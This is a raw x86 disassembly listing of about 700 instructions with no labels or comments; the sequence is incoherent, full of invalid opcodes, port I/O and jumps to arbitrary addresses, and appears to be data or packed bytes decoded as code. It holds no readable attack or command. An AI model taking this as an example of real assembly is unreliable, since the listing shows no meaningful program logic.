  41740f:	sub    DWORD PTR [edi+0x1c1c1c4b],edx
  417415:	shr    BYTE PTR [edx-0x49],cl
  417418:	rcr    DWORD PTR [ebx-0x9313b33],1
  41741e:	out    dx,al
  41741f:	stos   DWORD PTR es:[edi],eax
  417420:	rol    dh,0x19
  417423:	bswap  ebx
  417425:	pop    es
  417426:	adc    ah,BYTE PTR [ecx]
  417428:	add    DWORD PTR [ecx+eax*1-0x6cec1dfc],ebx
  41742f:	xchg   ebx,eax
  417430:	xchg   ebx,eax
  417431:	cmp    bh,BYTE PTR [eax]
  417433:	inc    esp
  417434:	int3   
  417435:	or     BYTE PTR [edi+0x5f],cl
  417438:	not    dl
  41743a:	je     0x417421
  41743c:	push   edx
  41743d:	mov    DWORD PTR [esi-0x49],esi
  417440:	inc    ebx
  417441:	ds lahf 
  417443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417444:	aad    0x6c
  417446:	jno    0x41742f
  417448:	into   
  417449:	sbb    eax,0x20bc534
  41744e:	es xchg ebx,eax
  417450:	sub    edx,edx
  417452:	jmp    0x2f49b663
  417457:	cmp    cl,BYTE PTR [edi+0x20913244]
  41745d:	xchg   ebx,eax
  41745e:	dec    esi
  41745f:	jno    0x4174bd
  417461:	cmp    cl,ah
  417463:	lock lock add bh,al
  417467:	mov    dh,0x11
  417469:	xchg   edx,eax
  41746a:	int3   
  41746b:	cmc    
  41746c:	imul   edx,edi,0x48
  41746f:	les    esp,FWORD PTR [edx-0x58]
  417472:	stos   BYTE PTR es:[edi],al
  417473:	sub    BYTE PTR [ecx-0x66],0xdc
  417477:	mov    esp,0xc6e6c4bd
  41747c:	cmp    eax,0x4f1cb932
  417481:	pop    edi
  417482:	jle    0x41740e
  417484:	sub    ecx,edi
  417486:	cmp    al,0xcd
  417488:	out    dx,al
  417489:	out    dx,al
  41748a:	rcl    DWORD PTR ds:[ebx+0x13],cl
  41748e:	xchg   esp,eax
  41748f:	retf   0xdca7
  417492:	mov    esi,0xb3669b7d
  417497:	leave  
  417498:	cld    
  417499:	ret    0xb302
  41749c:	push   ebx
  41749d:	push   ebx
  41749e:	cwde   
  41749f:	xchg   BYTE PTR [esi+0x13c4ebae],cl
  4174a5:	jno    0x417485
  4174a7:	jl     0x417474
  4174a9:	jnp    0x417459
  4174ab:	loopne 0x41746b
  4174ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174ae:	repz retf 0x2fcb
  4174b2:	xor    DWORD PTR [ebx+ebx*1+0x4a7a74a2],ebx
  4174b9:	es xchg ebx,eax
  4174bb:	mov    eax,ds:0x6ad32e54
  4174c0:	mov    ch,0xd0
  4174c2:	xor    al,0xd
  4174c4:	retf   
  4174c5:	mov    dh,0x38
  4174c7:	cmp    bh,BYTE PTR [edx]
  4174c9:	loop   0x4174a8
  4174cb:	ja     0x4174ac
  4174cd:	inc    ecx
  4174ce:	push   ebp
  4174cf:	push   esp
  4174d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174d2:	addr16 mov eax,0xd52af572
  4174d8:	ror    DWORD PTR [edx],cl
  4174da:	test   eax,0x8383864c
  4174df:	inc    ebx
  4174e0:	je     0x41753f
  4174e2:	addr16 jb 0x417557
  4174e5:	xchg   edx,eax
  4174e6:	inc    esp
  4174e7:	xor    cl,cl
  4174e9:	retf   0x12f2
  4174ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174ed:	adc    DWORD PTR [ecx+0x64],esp
  4174f0:	je     0x41747e
  4174f2:	jbe    0x41749b
  4174f4:	repz cmp dh,al
  4174f7:	stos   DWORD PTR es:[edi],eax
  4174f8:	addr16 cmp eax,0x84441f2e
  4174fe:	add    al,0x70
  417500:	push   es
  417501:	sub    BYTE PTR [ebp-0x70326035],dl
  417507:	mov    WORD PTR [eax-0x64a4d557],fs
  41750d:	fwait
  41750e:	int3   
  41750f:	dec    esp
  417510:	dec    edi
  417511:	xchg   edx,eax
  417512:	into   
  417513:	out    0x58,al
  417515:	pop    edi
  417516:	pop    ebp
  417517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417518:	jo     0x417596
  41751a:	or     al,0xae
  41751c:	inc    ebx
  41751d:	xor    bl,BYTE PTR [ecx-0x2b6595de]
  417523:	push   0x35
  417525:	mov    edx,0xf1c59756
  41752a:	jno    0x4175a0
  41752c:	dec    ebp
  41752d:	inc    ebp
  41752e:	shl    DWORD PTR [ebp+0x64],cl
  417531:	pop    ecx
  417532:	bound  edi,QWORD PTR [ecx+0x69]
  417535:	cdq    
  417536:	dec    edx
  417537:	cmc    
  417538:	xchg   esp,eax
  417539:	inc    esi
  41753a:	jae    0x4174d6
  41753c:	push   0x992a4e2c
  417541:	mov    ds:0xd3453d52,al
  417546:	jne    0x4174e2
  417548:	int    0x26
  41754a:	mov    dh,0x63
  41754c:	mov    ds:0x1c179a4b,eax
  417551:	ins    BYTE PTR es:[edi],dx
  417552:	aam    0xb1
  417554:	ins    DWORD PTR es:[edi],dx
  417555:	fwait
  417556:	dec    edx
  417557:	in     eax,0x94
  417559:	test   al,0x61
  41755b:	mov    al,ds:0xe9003a1b
  417560:	je     0x4174f4
  417562:	push   esi
  417563:	stos   DWORD PTR es:[edi],eax
  417564:	vpunpckhwd xmm0,xmm2,XMMWORD PTR ds:0x3768b2cb
  41756c:	fwait
  41756d:	les    esp,FWORD PTR [edx+0x38891a11]
  417573:	mov    ch,BYTE PTR [ebx+eiz*4]
  417576:	clc    
  417577:	(bad)  
  417578:	sub    BYTE PTR [ebp-0x27],0xe8
  41757c:	xor    DWORD PTR [ebp-0x5cb244aa],ebx
  417582:	fisub  WORD PTR [eax+0x75]
  417585:	ins    DWORD PTR es:[edi],dx
  417586:	popf   
  417587:	mov    eax,ds:0x69a610fc
  41758c:	jb     0x417587
  41758e:	jmp    0xe0f6333a
  417593:	int3   
  417594:	or     al,0x6f
  417596:	mov    esp,0x854a4df1
  41759b:	and    ch,BYTE PTR [edx-0x1d1e8f5a]
  4175a1:	add    eax,0x850e9d3a
  4175a6:	bound  eax,QWORD PTR [ecx-0x2f394296]
  4175ac:	push   eax
  4175ad:	push   cs
  4175ae:	dec    ebp
  4175af:	mov    edi,0xd28cd442
  4175b4:	outs   dx,BYTE PTR ds:[esi]
  4175b5:	mov    ch,0x89
  4175b7:	(bad)  
  4175b8:	jecxz  0x4175fe
  4175ba:	mov    ds:0x34e95271,eax
  4175bf:	(bad)
  4175c2:	xchg   DWORD PTR [edi-0xf],edi
  4175c5:	xchg   edi,eax
  4175c6:	jg     0x4175f5
  4175c8:	stc    
  4175c9:	cmp    DWORD PTR [edi],0xfffffff0
  4175cc:	lahf   
  4175cd:	popf   
  4175ce:	sahf   
  4175cf:	icebp  
  4175d0:	sar    BYTE PTR [eax+eiz*8+0x10],1
  4175d4:	push   es
  4175d5:	add    DWORD PTR [edi],ebx
  4175d7:	xor    DWORD PTR [esi-0x14],edi
  4175da:	daa    
  4175db:	(bad)  
  4175dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175dd:	(bad)  
  4175df:	popf   
  4175e0:	popf   
  4175e1:	pop    ds
  4175e2:	lea    ebx,[eax-0x19366e7a]
  4175e8:	fcomp  st(6)
  4175ea:	fadd   QWORD PTR [eax]
  4175ec:	xlat   BYTE PTR ds:[ebx]
  4175ed:	and    bl,BYTE PTR [esi]
  4175ef:	dec    ebx
  4175f0:	shr    BYTE PTR [esi+esi*1+0x68],1
  4175f4:	xor    al,0x1a
  4175f6:	fdiv   DWORD PTR [esi+0x1cccecc3]
  4175fc:	mov    cl,0x44
  4175fe:	add    al,BYTE PTR [ebp-0x6f]
  417601:	leave  
  417602:	fs jae 0x4175dd
  417605:	mov    dh,0x4d
  417607:	mov    ebx,0xf11222d5
  41760c:	sahf   
  41760d:	adc    dh,BYTE PTR [ebp+edi*4-0x1cb0164b]
  417614:	mov    ch,0x99
  417616:	lahf   
  417617:	cdq    
  417618:	and    DWORD PTR [ebx+0x674c90cd],ebx
  41761e:	sbb    BYTE PTR [ecx],bl
  417620:	push   ds
  417621:	out    0xde,al
  417623:	out    0x26,al
  417625:	aaa    
  417626:	outs   dx,DWORD PTR ds:[esi]
  417627:	fisub  WORD PTR [edx+0x47a22c58]
  41762d:	dec    esp
  41762e:	xchg   BYTE PTR [edi-0x74928b8e],al
  417634:	mov    ecx,0x452439d9
  417639:	gs jnp 0x4176a3
  41763c:	xchg   edi,eax
  41763d:	aad    0xd5
  41763f:	xor    eax,0xe1ef176c
  417644:	lahf   
  417645:	call   0x4e4d:0x4c9a6986
  41764c:	jno    0x4176a0
  41764e:	sub    dh,BYTE PTR [ebx-0x15]
  417651:	(bad)  
  417652:	dec    ebp
  417653:	div    dh
  417655:	div    BYTE PTR [eax]
  417657:	mov    WORD PTR [eax],cs
  417659:	arpl   WORD PTR [ebx+0x8cc44a3],sp
  41765f:	out    0xcf,eax
  417661:	popf   
  417662:	inc    ebx
  417663:	xchg   esi,eax
  417664:	adc    eax,0x6dfb7cde
  417669:	push   cs
  41766a:	femms  
  41766c:	call   0x2ed88ccb
  417671:	pop    ebp
  417672:	les    ecx,FWORD PTR [eax+0x26224418]
  417678:	stos   BYTE PTR es:[edi],al
  417679:	stos   BYTE PTR es:[edi],al
  41767a:	push   ecx
  41767b:	sub    BYTE PTR [ecx+edx*2],bl
  41767e:	test   eax,0x98989854
  417683:	inc    esp
  417684:	shl    DWORD PTR [ebp+0x56],cl
  417687:	xchg   edi,eax
  417688:	push   edi
  417689:	pop    eax
  41768a:	pop    edi
  41768b:	pop    ebx
  41768c:	repz sahf 
  41768e:	pop    ss
  41768f:	cmp    BYTE PTR [edi-0x5dab46c0],bh
  417695:	jo     0x4176f3
  417697:	mov    al,ds:0x3a30e9db
  41769c:	mov    fs,WORD PTR ds:[ebx+ebp*1]
  4176a0:	mov    ah,0x5b
  4176a2:	sub    eax,0x2f8e5964
  4176a7:	das    
  4176a8:	scas   eax,DWORD PTR es:[edi]
  4176a9:	jl     0x4176a4
  4176ab:	sbb    ebx,DWORD PTR [edi-0x5]
  4176ae:	dec    edx
  4176af:	cmp    BYTE PTR [ecx],bh
  4176b1:	call   0xf599c7
  4176b6:	push   ds
  4176b7:	xor    DWORD PTR [edx-0xbb82367],esi
  4176bd:	dec    eax
  4176be:	and    al,0x55
  4176c0:	cmp    BYTE PTR [edx],ch
  4176c2:	nop
  4176c3:	int    0xe
  4176c5:	adc    DWORD PTR [ebx-0x244a96bb],ecx
  4176cb:	aam    0x6a
  4176cd:	push   ebp
  4176ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176d0:	addr16 jmp 0x6ec78d30
  4176d6:	pusha  
  4176d7:	cmp    DWORD PTR [esi],edx
  4176d9:	mov    cl,0x58
  4176db:	sbb    BYTE PTR [eax+0x2c],0x4e
  4176df:	xor    dl,BYTE PTR [ebp-0x6a8a929c]
  4176e5:	in     eax,dx
  4176e6:	lods   eax,DWORD PTR ds:[esi]
  4176e7:	dec    ebp
  4176e8:	mov    dl,0xd9
  4176ea:	sbb    al,0x33
  4176ec:	xor    esi,DWORD PTR [ebx]
  4176ee:	in     al,0x87
  4176f0:	inc    edi
  4176f1:	mov    esp,0x6233ac5
  4176f6:	lods   eax,DWORD PTR ds:[esi]
  4176f7:	dec    esi
  4176f8:	sbb    edx,edi
  4176fa:	jno    0x41768d
  4176fc:	std    
  4176fd:	test   DWORD PTR [ebx*2+0x6cd5a5d7],edi
  417704:	shr    cl,cl
  417706:	mov    ah,0x11
  417708:	scas   al,BYTE PTR es:[edi]
  417709:	ret    
  41770a:	fsubr  st,st(0)
  41770c:	sbb    BYTE PTR [edx-0x39b16d5e],dl
  417712:	mov    cl,0x2c
  417714:	mov    ebp,DWORD PTR [edi-0x42]
  417717:	jns    0x4176a8
  417719:	pop    edx
  41771a:	mov    ch,0x86
  41771c:	mov    ds:0xd2fcbcc8,al
  417721:	inc    edi
  417722:	dec    ecx
  417723:	and    eax,0x5d3bb493
  417728:	mov    dl,0xa9
  41772a:	sbb    bh,ch
  41772c:	fdivr  QWORD PTR [eax+0x6bf89cb]
  417732:	ror    esp,0xec
  417735:	or     al,0xd3
  417737:	fnstenv [ecx+0x3a]
  41773a:	pop    ebp
  41773b:	retf   
  41773c:	or     edi,DWORD PTR [edx]
  41773e:	ss pop ebx
  417740:	fdiv   DWORD PTR [esi-0x3bb4db73]
  417746:	loop   0x4177b9
  417748:	mov    ah,BYTE PTR [edi]
  41774a:	inc    ebp
  41774b:	ss mov bh,0xb6
  41774e:	sub    BYTE PTR [esi],dl
  417750:	dec    ebx
  417751:	dec    esp
  417752:	dec    esp
  417753:	dec    esi
  417754:	jo     0x4177c4
  417756:	icebp  
  417757:	cmp    al,0xa9
  417759:	mov    bl,BYTE PTR fs:[esi+ebp*2+0x8]
  41775e:	retf   
  41775f:	mov    dl,0x28
  417761:	xchg   edi,eax
  417762:	mov    ebp,DWORD PTR [eax]
  417764:	mov    dh,bh
  417766:	adc    ebx,ebx
  417768:	(bad)  
  41776a:	out    0xde,al
  41776c:	cli    
  41776d:	sbb    dl,ch
  41776f:	dec    edx
  417770:	xchg   ebp,eax
  417771:	jmp    0x417742
  417773:	cmp    eax,0xd875d587
  417778:	(bad)  
  41777a:	and    dl,BYTE PTR [esi-0x79e79c78]
  417780:	push   0x9f9ab5
  417785:	jle    0x41776e
  417787:	dec    esp
  417788:	pop    es
  417789:	out    0x3,eax
  41778b:	mov    al,dl
  41778d:	add    bh,BYTE PTR [eax-0x3c]
  417790:	clc    
  417791:	call   0x703c9741
  417796:	lea    ecx,[eax-0x50a1468f]
  41779c:	jno    0x41778f
  41779e:	shl    BYTE PTR ds:0xbd864746,cl
  4177a4:	cdq    
  4177a5:	jns    0x417730
  4177a7:	adc    al,0xc3
  4177a9:	mov    ds:0x28ccc423,eax
  4177ae:	adc    edx,DWORD PTR [ebx]
  4177b0:	xchg   ebx,eax
  4177b1:	xor    al,0x1b
  4177b3:	or     eax,0x69b7b676
  4177b8:	aam    0x6b
  4177ba:	cwde   
  4177bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177bc:	dec    ecx
  4177bd:	mov    ebp,0xa956a75e
  4177c2:	shr    BYTE PTR [edx-0x4a],1
  4177c5:	cwde   
  4177c6:	call   0xccd3:0xcc7c629a
  4177cd:	push   ebx
  4177ce:	jecxz  0x4177b3
  4177d0:	aam    0xea
  4177d2:	or     eax,0xb12f2eee
  4177d7:	mov    ebx,0x76d745bb
  4177dc:	leave  
  4177dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177de:	mov    bl,0xd8
  4177e0:	mov    cs,WORD PTR [ebp+0x32]
  4177e3:	cdq    
  4177e4:	and    dl,BYTE PTR [ecx+0x346f5248]
  4177ea:	(bad)  
  4177ec:	fiadd  WORD PTR [esi+0x8]
  4177ef:	jo     0x41784d
  4177f1:	push   0x5a5e5b36
  4177f6:	xor    BYTE PTR [edi+0x39466a27],bl
  4177fc:	cmp    DWORD PTR [ecx],edi
  4177fe:	loope  0x4177f8
  417800:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417801:	sub    BYTE PTR [eax+ebp*2-0x5cb249a8],0x5e
  417809:	and    ebx,DWORD PTR [ebx+0x1b9432cd]
  41780f:	loop   0x4177f9
  417811:	test   al,0xc0
  417813:	lods   eax,DWORD PTR ds:[esi]
  417814:	(bad)  [edi-0x76b068d7]
  41781a:	lds    esp,FWORD PTR [edx-0x6cf0f374]
  417820:	dec    eax
  417821:	es mov ecx,0xc722e97c
  417827:	daa    
  417828:	add    eax,0xc9bcdd6e
  41782d:	jmp    0xa1e3119b
  417832:	cmp    al,0xa3
  417834:	and    esp,DWORD PTR [ebx+0x1c55aa54]
  41783a:	(bad)  
  41783b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41783c:	shr    DWORD PTR [eax+0x16208423],1
  417842:	mov    esi,DWORD PTR [ecx-0x17]
  417845:	test   eax,0xec1e1ccb
  41784a:	mov    bl,0xb3
  41784c:	mov    bl,0x83
  41784e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41784f:	imul   ebx,DWORD PTR [eax-0x2424e76f],0x1b
  417856:	in     al,dx
  417857:	out    dx,al
  417858:	ins    BYTE PTR es:[edi],dx
  417859:	arpl   WORD PTR [esi-0x43],ax
  41785c:	add    eax,0x76f7f743
  417861:	xchg   ebx,eax
  417862:	fcomip st,st(5)
  417864:	mov    ebp,0xfc2fd1ff
  417869:	icebp  
  41786a:	push   edi
  41786c:	sti    
  41786d:	into   
  41786e:	pop    ecx
  41786f:	(bad)  
  417870:	rol    DWORD PTR [edi],1
  417872:	or     DWORD PTR [ecx-0xef70ffb],esp
  417878:	(bad)  
  417879:	jle    0x417861
  41787b:	addr16 ror ebp,cl
  41787e:	push   esi
  41787f:	sti    
  417880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417881:	pop    esp
  417882:	ss dec ebx
  417884:	sub    dl,BYTE PTR [ecx+0x1976eac4]
  41788a:	sbb    eax,0xca9d2619
  41788f:	mov    ds:0xbbfb0a6a,al
  417894:	jnp    0x41790a
  417896:	cmp    ch,BYTE PTR [ebp+0x12]
  417899:	mov    DWORD PTR [edx+ecx*4],esp
  41789c:	stos   BYTE PTR es:[edi],al
  41789d:	jno    0x417911
  41789f:	jb     0x41782d
  4178a1:	add    BYTE PTR [ebx*2-0x492e590d],dh
  4178a8:	mov    ebp,0xbb7781c7
  4178ad:	pop    ebp
  4178ae:	sub    dl,ch
  4178b0:	dec    edx
  4178b1:	out    dx,eax
  4178b2:	rcr    DWORD PTR [edi+0x42],1
  4178b5:	inc    eax
  4178b6:	mov    ebx,0x52b4e2d9
  4178bb:	and    eax,0xf4f1ad55
  4178c0:	(bad)
  4178c3:	xchg   BYTE PTR [esi-0x45179652],al
  4178c9:	(bad)  
  4178ca:	push   edi
  4178cb:	mov    edi,0xf7f60dfe
  4178d0:	jbe    0x41790b
  4178d2:	cmp    al,0x3c
  4178d4:	loopne 0x4178ab
  4178d6:	xchg   edi,eax
  4178d7:	pop    esi
  4178d8:	out    0xda,al
  4178da:	xchg   ebp,eax
  4178db:	cmp    BYTE PTR ds:0x3229,bh
  4178e0:	cmp    bh,BYTE PTR [esp+eax*8]
  4178e3:	loope  0x4178b6
  4178e5:	xor    DWORD PTR [edi-0x41],ebp
  4178e8:	repz push cs
  4178ea:	pop    ebp
  4178eb:	stos   DWORD PTR es:[edi],eax
  4178ec:	sub    DWORD PTR [ebp+0x3b],0x3c
  4178f0:	jge    0x4178eb
  4178f2:	adc    ch,cl
  4178f4:	push   esp
  4178f5:	or     dl,BYTE PTR [ebp-0x6f]
  4178f8:	mov    DWORD PTR [ebp-0x5d],eax
  4178fb:	cld    
  4178fc:	rcr    DWORD PTR [edi+0x62e509fc],1
  417902:	xchg   ecx,eax
  417903:	push   esi
  417904:	mov    bl,0xc9
  417906:	push   ebx
  417907:	xchg   edi,eax
  417908:	and    BYTE PTR cs:[ebx],ch
  41790b:	sub    bl,BYTE PTR [ebp-0x25]
  41790e:	add    eax,0xaa121240
  417913:	loop   0x417942
  417915:	cmp    eax,0x6b2a2aae
  41791a:	jmp    0x417987
  41791c:	fdivr  QWORD PTR [esi-0x6abaec8f]
  417922:	mov    ecx,0x7887fcfe
  417927:	jmp    0xaa12:0xa54a65f2
  41792e:	mov    ds:0x49c44b10,al
  417933:	and    al,0x13
  417935:	dec    esp
  417936:	dec    ebp
  417937:	int    0xa0
  417939:	push   0x1a
  41793b:	in     eax,0x72
  41793d:	or     ebp,ebx
  41793f:	ror    BYTE PTR [ecx+0x25],1
  417942:	push   ebx
  417943:	ins    BYTE PTR es:[edi],dx
  417944:	fcomp  QWORD PTR [ebx-0x39]
  417947:	xor    BYTE PTR [edx],ah
  417949:	mov    edx,DWORD PTR [ebx]
  41794b:	cmp    ebx,esp
  41794d:	sub    dh,al
  41794f:	int    0x33
  417951:	sbb    eax,0x42180fa4
  417956:	add    bh,BYTE PTR [eax-0x7c]
  417959:	enter  0xbe97,0x7c
  41795d:	jge    0x4179a4
  41795f:	jg     0x4179d2
  417961:	mov    esp,0xee732a54
  417966:	cld    
  417967:	jns    0x41798d
  417969:	loope  0x41791d
  41796b:	mov    ebp,0x372e49b5
  417970:	inc    esp
  417971:	jle    0x4179d7
  417973:	call   0x385c:0x716eb7bb
  41797a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797b:	fucomi st,st(5)
  41797d:	xor    BYTE PTR [edx],bh
  41797f:	ss inc esi
  417981:	xor    dl,BYTE PTR [ecx+0x425cb4e4]
  417987:	push   ebx
  417988:	xor    eax,0xb338f112
  41798d:	jae    0x417982
  41798f:	sbb    BYTE PTR [edx+0x3704248e],bh
  417995:	outs   dx,BYTE PTR ds:[esi]
  417996:	fsub   QWORD PTR [eax-0x50ad52a6]
  41799c:	xlat   BYTE PTR ds:[ebx]
  41799d:	sbb    BYTE PTR ds:0x6c6c6519,bl
  4179a3:	or     al,0x55
  4179a5:	push   edi
  4179a6:	dec    ecx
  4179a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179a8:	push   edx
  4179a9:	in     al,dx
  4179aa:	sbb    eax,0x5c7c711c
  4179af:	and    BYTE PTR [esi],bl
  4179b1:	mov    edx,DWORD PTR [edx+0x555066c9]
  4179b7:	adc    eax,0x64515145
  4179bc:	adc    eax,0x6d90b6cb
  4179c1:	sbb    edi,eax
  4179c3:	mov    dh,0x1
  4179c5:	dec    edi
  4179c6:	mov    BYTE PTR ds:0xbb2f671,bh
  4179cc:	(bad)  [esi-0x69]
  4179cf:	bnd jmp 0x60ec13fe
  4179d5:	pop    ecx
  4179d6:	ss push ecx
  4179d8:	xor    ecx,DWORD PTR [edx+0xfc94669]
  4179de:	out    0x29,eax
  4179e0:	push   edi
  4179e1:	stos   BYTE PTR es:[edi],al
  4179e2:	sbb    al,0x1f
  4179e4:	sbb    eax,0xcbbdb3b1
  4179e9:	fcomp  st(0)
  4179eb:	sub    bl,al
  4179ed:	mov    ds:0xc2ff3ca3,eax
  4179f2:	xchg   DWORD PTR [eax],eax
  4179f4:	dec    eax
  4179f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179f6:	mov    bl,0xfc
  4179f8:	jmp    0x46cef89c
  4179fd:	mov    bl,0x81
  4179ff:	loope  0x4179e9
  417a01:	pop    eax
  417a02:	popf   
  417a03:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  417a05:	jp     0x4179a4
  417a07:	in     eax,0xe5
  417a09:	gs xchg edx,eax
  417a0b:	leave  
  417a0c:	and    al,0xc3
  417a0e:	ret    
  417a0f:	and    ebx,DWORD PTR [ecx+edi*4+0x7a]
  417a13:	sbb    eax,0x56a9d74d
  417a18:	stos   BYTE PTR es:[edi],al
  417a19:	and    al,0xe2
  417a1b:	dec    ecx
  417a1c:	repnz stc 
  417a1e:	popa   
  417a1f:	mov    dh,0xc7
  417a22:	cmp    DWORD PTR [eax+ebx*8],edi
  417a25:	daa    
  417a26:	xchg   ecx,eax
  417a27:	sbb    edx,ebx
  417a29:	in     al,dx
  417a2a:	popf   
  417a2b:	outs   dx,DWORD PTR ds:[esi]
  417a2c:	mov    esp,0x8f00484c
  417a31:	adc    al,0xa1
  417a33:	or     esi,eax
  417a35:	or     cl,dh
  417a37:	dec    ecx
  417a38:	jne    0x417a39
  417a3a:	xchg   edx,ebp
  417a3c:	jecxz  0x417a0d
  417a3e:	jl     0x417a34
  417a40:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a42:	dec    edx
  417a43:	ss popf 
  417a45:	and    BYTE PTR [esi-0x4f878c78],bl
  417a4b:	inc    edi
  417a4c:	mov    ebp,0xbd534356
  417a51:	push   esp
  417a52:	pop    edx
  417a53:	mov    ds:0x121240d1,eax
  417a58:	or     ecx,DWORD PTR [ebx-0x2d5ab719]
  417a5e:	les    edx,FWORD PTR [ebx]
  417a60:	fidiv  WORD PTR [ebx+0x12a5caf5]
  417a66:	daa    
  417a67:	daa    
  417a68:	daa    
  417a69:	sub    BYTE PTR [edx+0x1c186182],cl
  417a6f:	push   ds
  417a70:	sbb    al,0x78
  417a72:	dec    edi
  417a73:	or     eax,0x2dce2592
  417a78:	sub    al,0x92
  417a7a:	dec    esi
  417a7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a7c:	enter  0xf2e6,0xc
  417a80:	out    0x73,eax
  417a82:	in     al,dx
  417a83:	in     al,dx
  417a84:	in     al,dx
  417a85:	jno    0x417a6a
  417a87:	out    0x4d,al
  417a89:	mov    cs,WORD PTR [edi+0x69d3a40b]
  417a8f:	out    0x67,al
  417a91:	addr16 nop
  417a93:	xor    eax,0x7985c58d
  417a98:	test   BYTE PTR [eax+0x36eb79b8],dl
  417a9e:	imul   ebp,DWORD PTR [ebx+0x5d3a74ab],0xfffffff2
  417aa5:	ret    
  417aa6:	jns    0x417a5a
  417aa8:	mov    ecx,0x964c992c
  417aad:	test   eax,0xddee7189
  417ab2:	fnsetpm(287 only) 
  417ab4:	out    dx,al
  417ab5:	popf   
  417ab6:	cmp    ebp,esp
  417ab8:	in     eax,dx
  417ab9:	out    dx,eax
  417aba:	xchg   ebx,eax
  417abb:	leave  
  417abc:	fs cwde 
  417abe:	fwait
  417abf:	popf   
  417ac0:	es push ss
  417ac2:	(bad)  
  417ac3:	xor    edi,DWORD PTR [ebx]
  417ac5:	xor    ecx,DWORD PTR [ebp-0x243d556]
  417acb:	idiv   BYTE PTR [ebx+0x6415ab54]
  417ad1:	inc    ebp
  417ad2:	out    0xe2,al
  417ad4:	test   DWORD PTR [ebx],ecx
  417ad6:	je     0x417a93
  417ad8:	pop    ebp
  417ad9:	call   0x1a4d:0xec8a36ad
  417ae0:	jmp    0xa2ce:0xccccbb76
  417ae7:	sbb    edx,DWORD PTR [ecx]
  417ae9:	fidivr WORD PTR [ebx-0x11]
  417aec:	pop    ebp
  417aed:	mov    cs,WORD PTR [esi]
  417aef:	(bad)  
  417af1:	xor    al,0x9d
  417af3:	jmp    0xecfe4e1
  417af8:	psubusb mm3,mm3
  417afb:	fild   DWORD PTR [ebp-0x2b]
  417afe:	push   esp
  417aff:	inc    esi
  417b00:	xchg   BYTE PTR [edi-0x6f],al
  417b03:	gs cdq 
  417b05:	jbe    0x417ac2
  417b07:	test   DWORD PTR [esi-0x7555efb9],esp
  417b0d:	std    
  417b0e:	xchg   ebp,eax
  417b0f:	das    
  417b10:	jmp    0x12b43ad4
  417b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b16:	add    ebx,DWORD PTR [edi]
  417b18:	and    DWORD PTR [ebx+esi*4+0xa0f81be],esp
  417b1f:	(bad)  
  417b20:	jmp    0xd5d7db1c
  417b25:	bnd jmp 0xfd7107a2
  417b2b:	push   es
  417b2c:	mov    dh,0xaa
  417b2e:	mov    dl,0xb6
  417b30:	mov    esi,0xc351ab49
  417b35:	mov    BYTE PTR [eax-0x53882c22],bl
  417b3b:	push   cs
  417b3c:	jae    0x417b31
  417b3e:	or     ecx,DWORD PTR [esi+ecx*4-0x58b36e72]
  417b45:	test   eax,0xb8b8ead7
  417b4a:	and    al,0x12
  417b4c:	dec    ecx
  417b4d:	xchg   bl,dh
  417b4f:	ret    
  417b50:	aam    0x6b
  417b52:	push   ebp
  417b53:	ss aaa 
  417b55:	out    dx,al
  417b56:	jno    0x417b3f
  417b58:	out    dx,al
  417b59:	sbb    eax,0xf30a95aa
  417b5e:	or     ecx,DWORD PTR [ebx]
  417b60:	or     al,0xe5
  417b62:	xchg   DWORD PTR [eax],ebx
  417b64:	sbb    eax,0x395ca119
  417b69:	gs (bad) 
  417b6b:	call   0x5e3f7900
  417b70:	sbb    cl,ch
  417b72:	ss mov dh,0xed
  417b75:	and    BYTE PTR [ecx+0x12],cl
  417b78:	mov    dh,0x6d
  417b7a:	stc    
  417b7b:	add    ecx,0x964cb908
  417b81:	push   esp
  417b82:	xor    al,BYTE PTR [ecx+0x24]
  417b85:	mov    ds:0xd29ca953,al
  417b8a:	out    dx,al
  417b8b:	je     0x417b35
  417b8d:	push   esi
  417b8e:	sub    al,ah
  417b90:	mov    ds:0x864cb926,eax
  417b95:	xchg   ecx,eax
  417b96:	loope  0x417bd4
  417b98:	icebp  
  417b99:	js     0x417ba7
  417b9b:	(bad)  
  417b9c:	mov    ch,0x69
  417b9e:	ss pop ebx
  417ba0:	pop    eax
  417ba1:	(bad)  [esi]
  417ba3:	inc    edx
  417ba4:	and    BYTE PTR [ecx+ecx*8],0x74
  417ba8:	cmp    ebx,DWORD PTR ds:0xad0e9d3a
  417bae:	inc    esi
  417baf:	fwait
  417bb0:	xor    al,BYTE PTR fs:[ecx+0x32]
  417bb4:	in     eax,0x69
  417bb6:	hlt    
  417bb7:	mov    ebp,0x7bde7dbd
  417bbc:	out    dx,eax
  417bbd:	cmp    eax,0xde37cde
  417bc2:	div    dh
  417bc4:	idiv   BYTE PTR [ecx]
  417bc6:	ja     0x417ba9
  417bc8:	and    dl,bh
  417bca:	scas   al,BYTE PTR es:[edi]
  417bcb:	pop    ebp
  417bcc:	addr16 jbe 0x417c3d
  417bcf:	fisubr WORD PTR [ebx]
  417bd1:	cmp    dh,BYTE PTR [edx+0x6c]
  417bd4:	push   esp
  417bd5:	push   ebp
  417bd6:	and    eax,0xb1b04c91
  417bdb:	mov    cl,0xc1
